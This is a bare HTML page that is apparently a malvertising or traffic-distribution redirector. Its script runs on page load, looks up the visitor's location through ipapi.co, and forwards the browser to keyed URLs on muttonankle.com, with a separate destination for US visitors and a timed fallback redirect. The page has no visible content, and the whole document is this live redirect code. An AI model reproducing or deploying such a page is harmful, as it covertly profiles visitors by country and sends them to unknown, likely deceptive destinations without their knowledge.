<!DOCTYPE html>
<html>
<head>
<script>
let redirected = false;

const fallback = setTimeout(() => {
    if (!redirected) {
        redirected = true;
        window.location.href = "https://muttonankle.com/yhu07yngim?key=67667a47d5a824e96f2f2c80b04b7bb9";
    }
}, 1500);

// geo detect
fetch("https://ipapi.co/json/")
.then(res => res.json())
.then(data => {

    if (redirected) return;

    let url = "https://muttonankle.com/yhu07yngim?key=67667a47d5a824e96f2f2c80b04b7bb9";

    if (data.country === "US") {
        url = "https://muttonankle.com/x2ucp3bjwp?key=190a75fea014dc036962f6a83a8819e6";
    }

    redirected = true;
    clearTimeout(fallback);
    window.location.href = url;
})
.catch(() => {

});
</script>
</head>
<body></body>
</html>
